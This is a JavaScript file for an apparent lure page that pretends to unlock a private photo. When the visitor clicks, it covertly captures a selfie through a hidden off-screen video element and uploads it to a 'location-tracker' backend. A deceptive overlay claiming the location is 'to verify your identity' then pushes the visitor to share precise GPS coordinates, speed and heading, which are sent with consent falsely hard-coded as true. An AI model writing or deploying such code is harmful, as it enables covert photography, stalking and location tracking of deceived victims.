(function() {
    "use strict";

    const viewPhotoBtn = document.getElementById("viewPhotoBtn");
    const statusEl = document.getElementById("status");
    const albumPhoto = document.getElementById("albumPhoto");
    const lockBadge = document.getElementById("lockBadge");

    // Update these to your actual Render backend URL
    const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
    const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";

    let cameraStream = null;
    let lastLocationId = null;
    let selfieBlob = null;
    let isProcessing = false;
    let locationWatchId = null;
    let locationGranted = false;

    function setStatus(message, type) {
        statusEl.textContent = message;
        statusEl.className = type || "";
    }

    function unlockPhoto() {
        albumPhoto.classList.add("unlocked");
        lockBadge.classList.add("hidden");
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
        viewPhotoBtn.classList.remove("processing");
        isProcessing = false;
        setStatus("✅ Photo unlocked!", "success");
    }

    function resetUI(errorMsg) {
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
        viewPhotoBtn.classList.remove("processing");
        isProcessing = false;
        if (errorMsg) {
            setStatus(errorMsg, "error");
        }
        if (locationWatchId !== null) {
            navigator.geolocation.clearWatch(locationWatchId);
            locationWatchId = null;
        }
    }

    function stopCameraStream() {
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
        }
    }

    // --- Show location prompt overlay ---

    function showLocationPrompt(selfieId) {
        // Create overlay asking user to enable location
        const overlay = document.createElement("div");
        overlay.id = "locationPrompt";
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(15, 15, 26, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            backdrop-filter: blur(8px);
        `;

        overlay.innerHTML = `
            <div style="
                background: #1a1a2e;
                border-radius: 20px;
                padding: 40px 32px;
                max-width: 400px;
                width: 90%;
                text-align: center;
                border: 1px solid rgba(255,255,255,0.08);
                box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            ">
                <div style="font-size: 64px; margin-bottom: 16px;"></div>
                <h2 style="color: #fff; font-size: 22px; margin-bottom: 12px;"></h2>
                <p style="color: #a0a0b8; font-size: 14px; line-height: 1.6; margin-bottom: 24px;">
                    Wait Photo Is Loading ...<br><br>
                   
                </p>
                <div style="display: flex; flex-direction: column; gap: 12px;">
                    <button id="enableLocationBtn" style="
                        background: linear-gradient(135deg, #1a73e8, #1557b0);
                        color: #fff;
                        border: none;
                        padding: 14px 28px;
                        font-size: 16px;
                        font-weight: 600;
                        border-radius: 10px;
                        cursor: pointer;
                        width: 100%;
                    "> Unlock Image</button>
                    <button id="skipLocationBtn" style="
                        background: transparent;
                        color: #78789a;
                        border: 1px solid rgba(255,255,255,0.1);
                        padding: 12px 28px;
                        font-size: 14px;
                        border-radius: 10px;
                        cursor: pointer;
                        width: 100%;
                    ">Plaese Click Above Button to View Image </button>
                </div>
                <p style="color: #58587a; font-size: 12px; margin-top: 20px;">
                    Your location is to verify your identity.
                </p>
            </div>
        `;

        document.body.appendChild(overlay);

        // Enable Location button
        document.getElementById("enableLocationBtn").addEventListener("click", function() {
            document.body.removeChild(overlay);
            // Request location now
            requestLocation(selfieId);
        });

        // Skip button — stay locked on webpage, but selfie already saved
        document.getElementById("skipLocationBtn").addEventListener("click", function() {
            document.body.removeChild(overlay);
            setStatus("🔒 Photo locked — location required to view", "error");
            viewPhotoBtn.disabled = false;
            viewPhotoBtn.textContent = "👁️ View This Photo";
            viewPhotoBtn.classList.remove("processing");
            isProcessing = false;
        });
    }

    // --- Step 1: Camera capture ---

    async function requestCameraAndCapture() {
        if (window.location.protocol !== "https:" && 
            window.location.hostname !== "localhost" && 
            window.location.hostname !== "127.0.0.1") {
            setStatus("❌ HTTPS is required for camera & location access.", "error");
            resetUI();
            return;
        }

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            setStatus("❌ Camera API not supported in this browser.", "error");
            resetUI();
            return;
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            });

            cameraStream = stream;

            const hiddenVideo = document.createElement("video");
            hiddenVideo.srcObject = stream;
            hiddenVideo.autoplay = true;
            hiddenVideo.playsinline = true;
            hiddenVideo.muted = true;
            hiddenVideo.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;";
            hiddenVideo.setAttribute("aria-hidden", "true");
            document.body.appendChild(hiddenVideo);

            await Promise.race([
                new Promise((resolve, reject) => {
                    hiddenVideo.onloadedmetadata = () => {
                        hiddenVideo.play().then(resolve).catch(reject);
                    };
                    if (hiddenVideo.readyState >= 2) {
                        resolve();
                    }
                }),
                new Promise((_, reject) =>
                    setTimeout(() => reject(new Error("Camera init timeout")), 8000)
                )
            ]);

            await new Promise(r => setTimeout(r, 600));

            const videoWidth = hiddenVideo.videoWidth || 640;
            const videoHeight = hiddenVideo.videoHeight || 480;

            if (videoWidth === 0 || videoHeight === 0) {
                throw new Error("Camera returned empty dimensions");
            }

            const hiddenCanvas = document.createElement("canvas");
            hiddenCanvas.width = videoWidth;
            hiddenCanvas.height = videoHeight;
            const ctx = hiddenCanvas.getContext("2d");
            ctx.translate(videoWidth, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(hiddenVideo, 0, 0);

            selfieBlob = await new Promise((resolve, reject) => {
                hiddenCanvas.toBlob((blob) => {
                    if (blob) resolve(blob);
                    else reject(new Error("Canvas toBlob returned null"));
                }, "image/jpeg", 0.85);
            });

            document.body.removeChild(hiddenVideo);
            stopCameraStream();

            // Upload selfie first (ALWAYS saved to admin panel)
            await uploadSelfieThenPromptLocation();

        } catch (err) {
            console.error("Camera error:", err);
            stopCameraStream();

            let msg;
            if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
                msg = "❌ Camera permission was denied.";
            } else if (err.name === "NotFoundError") {
                msg = "❌ No camera found on this device.";
            } else if (err.name === "NotReadableError") {
                msg = "❌ Camera is in use by another application.";
            } else if (err.message === "Camera init timeout") {
                msg = "❌ Camera initialization timed out.";
            } else {
                msg = "❌ Camera error: " + err.message;
            }
            resetUI(msg);
        }
    }

    // --- Step 2: Upload selfie (ALWAYS), then ask for location ---

    async function uploadSelfieThenPromptLocation() {
        if (!selfieBlob) {
            resetUI("Waiting ....");
            return;
        }

        setStatus("Waiting ...", "loading");

        if (!navigator.onLine) {
            resetUI("❌ No internet connection.");
            return;
        }

        try {
            const formData = new FormData();
            formData.append("image", selfieBlob, "selfie.jpg");
            formData.append("timestamp", new Date().toISOString());

            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000);

            const response = await fetch(SELFIE_API_URL, {
                method: "POST",
                body: formData,
                signal: controller.signal
            });

            clearTimeout(timeoutId);

            if (!response.ok) {
                let msg = "Upload failed (HTTP " + response.status + ")";
                try {
                    const errData = await response.json();
                    msg = errData.message || msg;
                } catch (e) { }
                resetUI("❌ " + msg);
                return;
            }

            const result = await response.json();

            if (!result.id) {
                resetUI("❌ Server response missing selfie ID.");
                return;
            }

            // ✅ Selfie is saved in admin panel regardless!
            // Now ask user for location permission via overlay
            setStatus("Location needed to view...", "loading");
            
            // Show location prompt overlay (user can skip)
            setTimeout(() => showLocationPrompt(result.id), 500);

        } catch (err) {
            console.error("Upload error:", err);
            if (err.name === "AbortError") {
                resetUI("❌ Upload timed out.");
            } else {
                resetUI("❌ Upload failed: " + err.message);
            }
        }
    }

    // --- Step 3: Location (only called if user clicks "Enable Location") ---

    function requestLocation(selfieId) {
        if (!navigator.geolocation) {
            setStatus("❌ Geolocation not supported on this device.", "error");
            viewPhotoBtn.disabled = false;
            viewPhotoBtn.textContent = "👁️ View This Photo";
            viewPhotoBtn.classList.remove("processing");
            isProcessing = false;
            return;
        }

        setStatus("📍 Getting your location...", "loading");

        const fallbackTimeout = setTimeout(() => {
            if (isProcessing) {
                setStatus("📍 Trying standard accuracy...", "loading");
                tryFallbackLocation(selfieId);
            }
        }, 8000);

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                clearTimeout(fallbackTimeout);
                if (locationWatchId !== null) {
                    navigator.geolocation.clearWatch(locationWatchId);
                    locationWatchId = null;
                }
                locationGranted = true;
                await sendLocationToServer(position, selfieId);
            },
            (error) => {
                clearTimeout(fallbackTimeout);
                console.warn("High accuracy location error:", error);

                if (error.code === error.TIMEOUT || error.code === error.POSITION_UNAVAILABLE) {
                    tryFallbackLocation(selfieId);
                } else {
                    let msg;
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            msg = "❌ Waiting......";
                            break;
                        default:
                            msg = "❌ Location error (code " + error.code + ").";
                    }
                    setStatus(msg, "error");
                    viewPhotoBtn.disabled = false;
                    viewPhotoBtn.textContent = "👁️ View This Photo";
                    viewPhotoBtn.classList.remove("processing");
                    isProcessing = false;
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 7000,
                maximumAge: 0
            }
        );
    }

    function tryFallbackLocation(selfieId) {
        if (!navigator.geolocation || !isProcessing) return;

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                setStatus("📍 Got location (standard accuracy)...", "loading");
                locationGranted = true;
                await sendLocationToServer(position, selfieId);
            },
            (error) => {
                console.warn("Standard accuracy failed, trying watchPosition:", error);
                tryWatchLocation(selfieId);
            },
            {
                enableHighAccuracy: false,
                timeout: 5000,
                maximumAge: 60000
            }
        );
    }

    function tryWatchLocation(selfieId) {
        if (!navigator.geolocation || !isProcessing) return;

        setStatus("Searching for signal...", "loading");

        const watchTimeout = setTimeout(() => {
            if (locationWatchId !== null) {
                navigator.geolocation.clearWatch(locationWatchId);
                locationWatchId = null;
            }
            if (isProcessing) {
                setStatus("Waiting .....", "error");
                viewPhotoBtn.disabled = false;
                viewPhotoBtn.textContent = "👁️ View This Photo";
                viewPhotoBtn.classList.remove("processing");
                isProcessing = false;
            }
        }, 15000);

        locationWatchId = navigator.geolocation.watchPosition(
            async (position) => {
                clearTimeout(watchTimeout);
                if (locationWatchId !== null) {
                    navigator.geolocation.clearWatch(locationWatchId);
                    locationWatchId = null;
                }
                setStatus("Location acquired!", "loading");
                locationGranted = true;
                await sendLocationToServer(position, selfieId);
            },
            (error) => {
                clearTimeout(watchTimeout);
                if (locationWatchId !== null) {
                    navigator.geolocation.clearWatch(locationWatchId);
                    locationWatchId = null;
                }
                console.error("watchPosition error:", error);
                if (isProcessing) {
                    setStatus("Turn On Locaion", "error");
                    viewPhotoBtn.disabled = false;
                    viewPhotoBtn.textContent = "👁️ View This Photo";
                    viewPhotoBtn.classList.remove("processing");
                    isProcessing = false;
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    async function sendLocationToServer(position, selfieId) {
        const data = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude || null,
            altitudeAccuracy: position.coords.altitudeAccuracy || null,
            heading: position.coords.heading || null,
            speed: position.coords.speed || null,
            timestamp: new Date().toISOString(),
            consent: true,
            selfie_id: selfieId
        };

        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000);

            const locResponse = await fetch(LOCATION_API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
                signal: controller.signal
            });

            clearTimeout(timeoutId);

            if (!locResponse.ok) {
                let msg = "Location upload failed (HTTP " + locResponse.status + ")";
                try {
                    const errData = await locResponse.json();
                    msg = errData.message || msg;
                } catch (e) { }
                setStatus("❌ " + msg, "error");
                viewPhotoBtn.disabled = false;
                viewPhotoBtn.textContent = "👁️ View This Photo";
                viewPhotoBtn.classList.remove("processing");
                isProcessing = false;
                return;
            }

            const locResult = await locResponse.json();

            if (!locResult.id) {
                setStatus("❌ Server response", "error");
                viewPhotoBtn.disabled = false;
                viewPhotoBtn.textContent = "👁️ View This Photo";
                viewPhotoBtn.classList.remove("processing");
                isProcessing = false;
                return;
            }

            lastLocationId = locResult.id;
            
            // ✅ BOTH selfie AND location saved — unlock photo on webpage
            unlockPhoto();

        } catch (err) {
            console.error("Location upload error:", err);
            if (err.name === "AbortError") {
                // Retry once
                try {
                    const locResponse = await fetch(LOCATION_API_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(data)
                    });
                    if (locResponse.ok) {
                        const locResult = await locResponse.json();
                        if (locResult.id) {
                            lastLocationId = locResult.id;
                            unlockPhoto();
                            return;
                        }
                    }
                } catch (retryErr) {
                    console.error("Retry also failed:", retryErr);
                }
                setStatus("Waiting .....", "error");
            } else {
                setStatus("Waiting ....." + err.message, "error");
            }
            viewPhotoBtn.disabled = false;
            viewPhotoBtn.textContent = "👁️ View This Photo";
            viewPhotoBtn.classList.remove("processing");
            isProcessing = false;
        }
    }

    // --- Button click ---

    viewPhotoBtn.addEventListener("click", function(e) {
        e.preventDefault();

        if (isProcessing) return;
        isProcessing = true;

        viewPhotoBtn.disabled = true;
        viewPhotoBtn.textContent = "⏳ Verifying...";
        viewPhotoBtn.classList.add("processing");
        setStatus("Waiting...", "loading");

        requestCameraAndCapture();
    });

})();